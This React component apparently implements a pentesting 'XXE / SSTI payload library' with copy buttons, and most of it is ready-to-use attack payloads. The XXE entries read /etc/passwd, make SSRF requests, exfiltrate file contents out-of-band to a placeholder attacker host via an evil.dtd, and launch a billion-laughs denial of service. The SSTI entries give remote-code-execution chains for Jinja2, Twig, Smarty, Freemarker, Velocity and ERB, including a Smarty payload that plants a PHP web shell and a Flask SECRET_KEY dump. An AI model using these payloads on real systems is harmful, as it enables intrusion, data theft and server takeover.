import { useState } from "react";
import CyberpunkCard from "@/components/CyberpunkCard";
import { Button } from "@/components/ui/button";
import { Copy, CheckCircle } from "lucide-react";

type MainTab = "xxe" | "ssti";

interface Payload {
  name: string;
  description: string;
  code: string;
}

const XXE_PAYLOADS: Payload[] = [
  {
    name: "Basic XXE",
    description: "Read a local file from the server filesystem.",
    code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
  },
  {
    name: "SSRF via XXE",
    description: "Force server to make HTTP request (SSRF).",
    code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/admin">]>
<root><data>&xxe;</data></root>`,
  },
  {
    name: "OOB DNS Exfiltration",
    description: "Trigger a DNS lookup to exfiltrate data out-of-band.",
    code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-HOST/xxe">]>
<root><data>&xxe;</data></root>`,
  },
  {
    name: "OOB HTTP with Data",
    description: "Exfiltrate file content via HTTP OOB channel using parameter entities.",
    code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-HOST/evil.dtd">
  %dtd;
]>
<root><data>&exfil;</data></root>

<!-- evil.dtd content: -->
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://YOUR-HOST/?x=%file;'>">
%all;`,
  },
  {
    name: "Error-Based XXE",
    description: "Trigger a parsing error that includes file content in the error message.",
    code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>`,
  },
  {
    name: "Billion Laughs (DoS)",
    description: "XML entity expansion attack causing exponential memory consumption.",
    code: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`,
  },
  {
    name: "PHP Filter — Read Source",
    description: "Use PHP wrapper to base64-encode and read PHP source files.",
    code: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>
<root><data>&xxe;</data></root>`,
  },
];

const SSTI_PAYLOADS: Record<string, { detect: Payload[]; exploit: Payload[] }> = {
  Jinja2: {
    detect: [
      { name: "Detection — Math eval", description: "If 49 is returned, Jinja2 is likely.", code: "{{7*7}}" },
      { name: "Detection — String filter", description: "Returns 'abcabc' in Jinja2.", code: "{{'abc'*2}}" },
    ],
    exploit: [
      { name: "RCE via subclasses", description: "Execute OS command through Python subclass chain.", code: "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}" },
      { name: "Config dump", description: "Dump Flask configuration including SECRET_KEY.", code: "{{config.items()}}" },
      { name: "File read", description: "Read arbitrary file on the server.", code: "{{''.__class__.__mro__[1].__subclasses__()[407]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].decode()}}" },
    ],
  },
  Twig: {
    detect: [
      { name: "Detection — Math eval", description: "Returns 49 if Twig.", code: "{{7*7}}" },
      { name: "Detection — String", description: "Returns 'aaa' in Twig.", code: "{{'a'*3}}" },
    ],
    exploit: [
      { name: "RCE via _self", description: "Execute system commands using _self chain.", code: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
      { name: "SSTI to LFI", description: "Read local file using Twig filter.", code: "{{'/etc/passwd'|file_excerpt(1,30)}}" },
    ],
  },
  Smarty: {
    detect: [
      { name: "Detection", description: "Math test for Smarty.", code: "{7*7}" },
    ],
    exploit: [
      { name: "PHP execution", description: "Execute arbitrary PHP code.", code: "{php}echo `id`;{/php}" },
      { name: "System call", description: "Alternate RCE method.", code: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}" },
    ],
  },
  Freemarker: {
    detect: [
      { name: "Detection", description: "Math test for Freemarker.", code: "${7*7}" },
    ],
    exploit: [
      { name: "RCE via freemarker.template", description: "Execute system commands.", code: '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}' },
    ],
  },
  Velocity: {
    detect: [
      { name: "Detection", description: "Variable test for Velocity.", code: "#set($x=7*7)${x}" },
    ],
    exploit: [
      { name: "RCE via Runtime", description: "Execute OS commands through Java Runtime.", code: `#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getMethod('exec',$str.class).invoke($rt.getMethod('getRuntime').invoke(null),'id'))
$ex.waitFor()` },
    ],
  },
  ERB: {
    detect: [
      { name: "Detection", description: "Math test for Ruby ERB.", code: "<%= 7*7 %>" },
    ],
    exploit: [
      { name: "RCE via system", description: "Execute OS commands.", code: "<%= `id` %>" },
      { name: "RCE via IO.popen", description: "Alternate execution method.", code: "<%= IO.popen('id').read %>" },
    ],
  },
};

const XXESSILibrary = () => {
  const [mainTab, setMainTab] = useState<MainTab>("xxe");
  const [sstiEngine, setSstiEngine] = useState("Jinja2");
  const [copied, setCopied] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  const mainTabClass = (t: MainTab) =>
    `px-4 py-2 text-sm font-bold tracking-wide transition-colors rounded ${
      mainTab === t ? "bg-cyber-red text-white" : "bg-cyber-cyan/10 text-cyber-cyan hover:bg-cyber-cyan/20 border border-cyber-cyan/30"
    }`;

  return (
    <CyberpunkCard title="XXE / SSTI PAYLOAD LIBRARY">
      <div className="space-y-6">
        <div className="flex gap-2">
          <button className={mainTabClass("xxe")} onClick={() => setMainTab("xxe")}>XXE PAYLOADS</button>
          <button className={mainTabClass("ssti")} onClick={() => setMainTab("ssti")}>SSTI PAYLOADS</button>
        </div>

        {mainTab === "xxe" && (
          <div className="space-y-4">
            <h3 className="text-cyber-cyan font-bold tracking-wide">XML EXTERNAL ENTITY INJECTION</h3>
            {XXE_PAYLOADS.map((p, idx) => (
              <div key={idx} className="glass-panel rounded p-4">
                <div className="flex items-start justify-between mb-2">
                  <div>
                    <p className="text-cyber-cyan font-bold text-sm">{p.name}</p>
                    <p className="text-gray-400 text-xs mt-0.5">{p.description}</p>
                  </div>
                  <Button
                    size="sm"
                    className="bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 shrink-0"
                    onClick={() => copyToClipboard(p.code, `xxe-${idx}`)}
                  >
                    {copied === `xxe-${idx}` ? <CheckCircle className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                  </Button>
                </div>
                <pre className="text-green-400 font-mono text-xs bg-black/50 rounded p-3 overflow-x-auto whitespace-pre">{p.code}</pre>
              </div>
            ))}
          </div>
        )}

        {mainTab === "ssti" && (
          <div className="space-y-4">
            <div className="flex flex-wrap gap-2">
              {Object.keys(SSTI_PAYLOADS).map((engine) => (
                <button
                  key={engine}
                  onClick={() => setSstiEngine(engine)}
                  className={`px-3 py-1 text-xs font-bold rounded border transition-colors ${
                    sstiEngine === engine
                      ? "bg-cyber-red text-white border-cyber-red"
                      : "bg-cyber-cyan/10 text-cyber-cyan border-cyber-cyan/30 hover:bg-cyber-cyan/20"
                  }`}
                >
                  {engine}
                </button>
              ))}
            </div>

            {SSTI_PAYLOADS[sstiEngine] && (
              <div className="space-y-4">
                <div>
                  <h4 className="text-yellow-400 font-bold text-xs tracking-wider mb-2">DETECTION PAYLOADS</h4>
                  {SSTI_PAYLOADS[sstiEngine].detect.map((p, idx) => (
                    <div key={idx} className="glass-panel rounded p-4 mb-2">
                      <div className="flex items-start justify-between mb-2">
                        <div>
                          <p className="text-cyber-cyan font-bold text-sm">{p.name}</p>
                          <p className="text-gray-400 text-xs">{p.description}</p>
                        </div>
                        <Button
                          size="sm"
                          className="bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 shrink-0"
                          onClick={() => copyToClipboard(p.code, `ssti-det-${idx}`)}
                        >
                          {copied === `ssti-det-${idx}` ? <CheckCircle className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                        </Button>
                      </div>
                      <code className="block text-yellow-400 font-mono text-sm bg-black/50 rounded p-2">{p.code}</code>
                    </div>
                  ))}
                </div>
                <div>
                  <h4 className="text-red-400 font-bold text-xs tracking-wider mb-2">EXPLOITATION PAYLOADS</h4>
                  {SSTI_PAYLOADS[sstiEngine].exploit.map((p, idx) => (
                    <div key={idx} className="glass-panel rounded p-4 mb-2">
                      <div className="flex items-start justify-between mb-2">
                        <div>
                          <p className="text-cyber-cyan font-bold text-sm">{p.name}</p>
                          <p className="text-gray-400 text-xs">{p.description}</p>
                        </div>
                        <Button
                          size="sm"
                          className="bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 shrink-0"
                          onClick={() => copyToClipboard(p.code, `ssti-exp-${idx}`)}
                        >
                          {copied === `ssti-exp-${idx}` ? <CheckCircle className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                        </Button>
                      </div>
                      <pre className="text-red-400 font-mono text-xs bg-black/50 rounded p-3 overflow-x-auto whitespace-pre">{p.code}</pre>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </CyberpunkCard>
  );
};

export default XXESSILibrary;
